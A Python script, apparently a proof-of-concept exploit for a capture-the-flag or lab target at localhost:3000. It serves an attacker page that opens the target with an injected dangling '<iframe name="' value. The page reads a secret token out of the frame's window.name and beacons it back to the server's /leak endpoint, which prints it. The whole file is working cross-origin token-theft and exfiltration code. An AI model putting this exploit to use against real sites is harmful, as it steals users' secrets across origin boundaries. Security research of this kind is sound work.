from __future__ import annotations

import html
import re
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlsplit


TARGET = "http://127.0.0.1:3000"


class Handler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urlsplit(self.path)
        if parsed.path in {"/leak", "/log"}:
            token = parse_qs(parsed.query).get("token", [""])[-1]
            print(f"{parsed.path.upper()} {token}", flush=True)
            self.send_response(204)
            self.end_headers()
            return

        if parsed.path == "/return":
            body = b"<!doctype html><title>return</title>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        target = html.escape(TARGET, quote=True)
        body = f"""<!doctype html>
<pre id=o>init</pre><script>
const o=document.querySelector('#o');
const log=x=>(new Image).src='/log?token='+encodeURIComponent(x);
const t=window.open('{target}/?content='+encodeURIComponent('<iframe name="'),'victim');
setTimeout(()=>{{
  try {{
    log('popup='+!!t+',frames='+t.frames.length);
    const c=t.frames[0];
    try {{ open.call(c,'about:blank','_self'); log('opencall=ok'); }}
    catch(e) {{ log('opencall:'+e); }}
    setTimeout(()=>{{
      try {{
        const m=c.name.match(/TOKEN_[0-9a-f]{{16}}/);
        o.textContent=m?m[0]:'miss';
        if(m)(new Image).src='/leak?token='+m[0]; else log('name='+c.name);
      }} catch(e) {{ log('read:'+e); }}
    }},500);
  }} catch(e) {{ o.textContent=String(e); log('outer:'+e); }}
}},2000);
</script>""".encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=UTF-8")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


ThreadingHTTPServer(("127.0.0.1", 8780), Handler).serve_forever()
